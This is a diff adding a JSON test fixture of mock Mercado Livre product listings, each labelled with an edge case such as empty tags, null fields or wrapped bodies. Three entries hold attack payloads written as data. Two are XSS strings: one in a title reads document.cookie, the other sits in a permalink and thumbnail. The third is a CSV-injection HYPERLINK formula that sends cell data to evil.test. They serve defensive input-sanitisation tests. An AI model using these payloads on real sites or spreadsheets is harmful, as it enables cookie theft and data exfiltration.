@@ -1,0 +1,172 @@
+[
+  {
+    "_case": "clean_positive",
+    "id": "MLB1000000001",
+    "title": "Camiseta Básica Algodão Pima Masculina Premium",
+    "price": 79.9,
+    "permalink": "https://produto.mercadolivre.com.br/MLB-1000000001-camiseta",
+    "thumbnail": "https://http2.mlstatic.com/D_NQ_NP_1.webp",
+    "tags": ["good_quality_picture", "good_quality_thumbnail", "free_shipping", "brand_verified"]
+  },
+  {
+    "_case": "incomplete_specs",
+    "id": "MLB1000000002",
+    "title": "Tênis Esportivo Corrida Leve Unissex",
+    "price": 199.99,
+    "permalink": "https://produto.mercadolivre.com.br/MLB-1000000002-tenis",
+    "thumbnail": "https://http2.mlstatic.com/D_NQ_NP_2.webp",
+    "tags": ["incomplete_technical_specs", "free_shipping"]
+  },
+  {
+    "_case": "multi_problem",
+    "id": "MLB1000000003",
+    "title": "Kit 3 Panelas Antiaderente Cabo Madeira",
+    "price": 349.5,
+    "permalink": "https://produto.mercadolivre.com.br/MLB-1000000003-panelas",
+    "thumbnail": "https://http2.mlstatic.com/D_NQ_NP_3.webp",
+    "tags": ["poor_quality_picture", "poor_quality_thumbnail", "moderation_penalty", "incomplete_technical_specs"]
+  },
+  {
+    "_case": "empty_tags",
+    "id": "MLB1000000004",
+    "title": "Mochila Notebook Resistente Água 30L",
+    "price": 129.0,
+    "permalink": "https://produto.mercadolivre.com.br/MLB-1000000004-mochila",
+    "thumbnail": "https://http2.mlstatic.com/D_NQ_NP_4.webp",
+    "tags": []
+  },
+  {
+    "_case": "null_tags",
+    "id": "MLB1000000005",
+    "title": "Fone Bluetooth In-ear Esportivo",
+    "price": 89.9,
+    "permalink": "https://produto.mercadolivre.com.br/MLB-1000000005-fone",
+    "thumbnail": "https://http2.mlstatic.com/D_NQ_NP_5.webp",
+    "tags": null
+  },
+  {
+    "_case": "missing_tags_key",
+    "id": "MLB1000000006",
+    "title": "Garrafa Térmica Inox 1 Litro",
+    "price": 59.9,
+    "permalink": "https://produto.mercadolivre.com.br/MLB-1000000006-garrafa",
+    "thumbnail": "https://http2.mlstatic.com/D_NQ_NP_6.webp"
+  },
+  {
+    "_case": "catalog_info",
+    "id": "MLB1000000007",
+    "title": "Smartphone Galaxy A54 128GB",
+    "price": 1599.0,
+    "permalink": "https://produto.mercadolivre.com.br/MLB-1000000007-galaxy",
+    "thumbnail": "https://http2.mlstatic.com/D_NQ_NP_7.webp",
+    "tags": ["catalog_listing", "user_product_listing", "catalog_boost"]
+  },
+  {
+    "_case": "variations_migrated",
+    "id": "MLB1000000008",
+    "title": "Vestido Floral Verão Viscose",
+    "price": 119.9,
+    "permalink": "https://produto.mercadolivre.com.br/MLB-1000000008-vestido",
+    "thumbnail": "https://http2.mlstatic.com/D_NQ_NP_8.webp",
+    "tags": ["variations_migration_uptin", "free_shipping"],
+    "variations": [
+      { "id": 111, "attribute_combinations": [{ "name": "Cor", "value_name": "Azul" }] },
+      { "id": 222, "attribute_combinations": [{ "name": "Cor", "value_name": "Vermelho" }] }
+    ]
+  },
+  {
+    "_case": "accented_title",
+    "id": "MLB1000000009",
+    "title": "Coração de Mãe — Caneca Cerâmica Edição Limitada Ação Promoção",
+    "price": 39.9,
+    "permalink": "https://produto.mercadolivre.com.br/MLB-1000000009-caneca",
+    "thumbnail": "https://http2.mlstatic.com/D_NQ_NP_9.webp",
+    "tags": ["incomplete_technical_specs"]
+  },
+  {
+    "_case": "body_wrapper",
+    "description": "Descrição longa do produto.",
+    "body": {
+      "id": "MLB1000000010",
+      "title": "Relógio Digital Esportivo À Prova D'água",
+      "price": 149.9,
+      "permalink": "https://produto.mercadolivre.com.br/MLB-1000000010-relogio",
+      "thumbnail": "https://http2.mlstatic.com/D_NQ_NP_10.webp",
+      "tags": ["poor_quality_picture", "free_shipping"]
+    }
+  },
+  {
+    "_case": "result_wrapper",
+    "result": {
+      "id": "MLB1000000011",
+      "title": "Liquidificador 3 Velocidades 500W",
+      "price": 99.9,
+      "permalink": "https://produto.mercadolivre.com.br/MLB-1000000011-liquidificador",
+      "thumbnail": "https://http2.mlstatic.com/D_NQ_NP_11.webp",
+      "tags": ["incomplete_technical_specs"]
+    }
+  },
+  {
+    "_case": "xss_title",
+    "id": "MLB1000000012",
+    "title": "<img src=x onerror=alert(document.cookie)>\"><b>PWNED</b>",
+    "price": 10.0,
+    "permalink": "https://produto.mercadolivre.com.br/MLB-1000000012-xss",
+    "thumbnail": "https://http2.mlstatic.com/D_NQ_NP_12.webp",
+    "tags": ["incomplete_technical_specs"]
+  },
+  {
+    "_case": "xss_permalink",
+    "id": "MLB1000000013",
+    "title": "Produto com permalink malicioso",
+    "price": 20.0,
+    "permalink": "https://x.test/\"><script>alert(1)</script>",
+    "thumbnail": "javascript:alert(1)",
+    "tags": ["free_shipping"]
+  },
+  {
+    "_case": "csv_injection",
+    "id": "MLB1000000014",
+    "title": "=HYPERLINK(\"http://evil.test/steal?c=\"&A1,\"Clique aqui\")",
+    "price": 30.0,
+    "permalink": "https://produto.mercadolivre.com.br/MLB-1000000014-csvinj",
+    "thumbnail": "https://http2.mlstatic.com/D_NQ_NP_14.webp",
+    "tags": ["incomplete_technical_specs"]
+  },
+  {
+    "_case": "price_zero",
+    "id": "MLB1000000015",
+    "title": "Brinde Promocional Gratuito",
+    "price": 0,
+    "permalink": "https://produto.mercadolivre.com.br/MLB-1000000015-brinde",
+    "thumbnail": "https://http2.mlstatic.com/D_NQ_NP_15.webp",
+    "tags": ["free_shipping"]
+  },
+  {
+    "_case": "semicolon_quote_title",
+    "id": "MLB1000000016",
+    "title": "Kit 3 itens; modelo \"Premium\" novo",
+    "price": 75.0,
+    "permalink": "https://produto.mercadolivre.com.br/MLB-1000000016-kit",
+    "thumbnail": "https://http2.mlstatic.com/D_NQ_NP_16.webp",
+    "tags": ["poor_quality_picture"]
+  },
+  {
+    "_case": "null_fields",
+    "id": null,
+    "title": null,
+    "price": null,
+    "permalink": null,
+    "thumbnail": null,
+    "tags": ["free_shipping"]
+  },
+  {
+    "_case": "newline_title",
+    "id": "MLB1000000018",
+    "title": "Camisa Polo\nGola V\r\nAlgodão",
+    "price": 64.9,
+    "permalink": "https://produto.mercadolivre.com.br/MLB-1000000018-polo",
+    "thumbnail": "https://http2.mlstatic.com/D_NQ_NP_18.webp",
+    "tags": ["incomplete_technical_specs"]
+  }
+]
